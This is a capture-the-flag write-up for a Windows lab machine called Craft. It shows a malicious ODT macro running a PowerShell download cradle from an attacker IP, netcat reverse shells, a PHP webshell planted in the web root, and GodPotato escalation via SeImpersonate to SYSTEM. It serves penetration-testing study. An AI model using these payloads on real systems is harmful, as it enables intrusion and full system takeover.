#Windows #ODT #MacroExecution #PhishingUpload #SeImpersonate #GodPotato #WebShell #LateralMovement

## Overview

Craft is a Windows machine where the entire attack chain runs through a file upload that accepts only `.odt` documents. A LibreOffice macro embedded in the ODT executes a PowerShell download cradle when the server-side process opens the file, landing a shell as the document-processing user. From there, write access to the web root enables a PHP webshell that reveals a second, higher-privileged user running Apache with SeImpersonatePrivilege, which GodPotato converts to SYSTEM.

## Recon

### Web Enumeration

The landing page reveals the admin email `admin@craft.offsec`, added to `/etc/hosts`. A Gobuster scan of port 80 finds an `/uploads` directory alongside the standard XAMPP paths:

```sh
gobuster dir -u http://192.168.183.169 -w /home/kali/Tools/SecLists/Discovery/Web-Content/big.txt
/assets   (Status: 301)
/uploads  (Status: 301)
/phpmyadmin  (Status: 403)
```

Attempting to access `upload.php` without a file triggers a server-side error that reveals the restriction:

```
Warning: Trying to access array offset on value of type null in C:\xampp\htdocs\upload.php on line 10
File is not valid. Please submit ODT file
```

The error also leaks the full server path: `C:\xampp\htdocs\upload.php`.

## Foothold

### Malicious ODT Macro

LibreOffice Basic macros can call shell commands. The plan: embed a macro that runs on document open, executing a PowerShell download cradle that fetches and runs a reverse shell from Kali.

In LibreOffice: Tools > Macros > Organize Macros > Basic. Create a new macro named `evil` under the document:

```vb
Sub Main
    Shell("cmd /c powershell ""iex(new-object net.webclient).downloadstring('http://192.168.45.185/shell.ps1')""")
End Sub
```

Then in Tools > Customize, set the trigger event to "Open Document" and assign the `evil` macro. Save as `.odt`.

> **Why macro-on-open works here:** when the server processes an uploaded ODT, it opens the document to render or inspect it. LibreOffice Basic macros bound to the Open Document event fire the moment the document loads, no user click required. The shell runs under whatever account LibreOffice uses on the server.

After uploading, the HTTP server receives the callback:

```sh
192.168.194.169 - - [12/Aug/2024 14:27:44] "GET /shell.ps1 HTTP/1.1" 200 -
```

Shell caught as `craft\thecybergeek`:

```sh
rlwrap nc -lvnp 53
connect to [...] from (UNKNOWN) [192.168.194.169] 49821
whoami
craft\thecybergeek
```

Local flag:

```powershell
PS C:\Users\thecybergeek\Desktop> type local.txt
‹redacted›
```

### Lateral Move to Apache via Web Shell

After upgrading to a PowerCat shell for stability, WinPEAS reveals that `thecybergeek` has write access to `C:\xampp\htdocs`, the web root. This opens a second vector. Uploading the Ivan Sincek PHP reverse shell to the web root and requesting it:

```
http://192.168.194.169/shell2.php
```

```sh
rlwrap nc -lvnp 445
connect to [...] from (UNKNOWN) [192.168.194.169] 49828
C:\xampp\htdocs> whoami
craft\apache
```

> **Why pivot to Apache:** `thecybergeek` is the document-processing user, a human account, but likely without privileged tokens. `apache`, the IIS/XAMPP service account, runs the web server and commonly carries SeImpersonatePrivilege, which is the escalation path. Checking `whoami /priv` on the new shell confirms it.

## Privilege Escalation

### SeImpersonate, GodPotato NET4

`apache`'s privileges:

```powershell
C:\xampp\htdocs> whoami /priv
SeImpersonatePrivilege   Impersonate a client after authentication   Enabled
```

Checking the .NET framework version on the registry confirms NET4 is present:

```powershell
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
```

GodPotato NET4 chains the impersonation token into a SYSTEM process. Running it with nc64 as the payload:

```powershell
PS C:\Users\apache\Desktop> .\potato.exe -cmd ".\nc.exe 192.168.45.185 8080 -e C:\Windows\System32\cmd.exe"
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] Find System Token : True
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 5072
```

## Root / SYSTEM

```sh
rlwrap nc -lvnp 8080
connect to [...] from (UNKNOWN) [192.168.194.169] 49891
Microsoft Windows [Version 10.0.17763.2029]

C:\Windows\system32> whoami
(blank — known GodPotato quirk)
```

```powershell
C:\Users\Administrator\Desktop> type proof.txt
‹redacted›
```

## Takeaways

- **Error messages are recon.** The failed upload response gave the exact server path and the required file type in one shot, read every error carefully.
- **Write access to a web root is almost always a shell.** Once `thecybergeek` could write PHP to `htdocs`, the lateral move to `apache` was one file upload away.
- **Service accounts and SeImpersonate go together.** Web server service accounts routinely hold SeImpersonatePrivilege by design; it's the first thing to check after landing as IIS, Apache, or MSSQL.
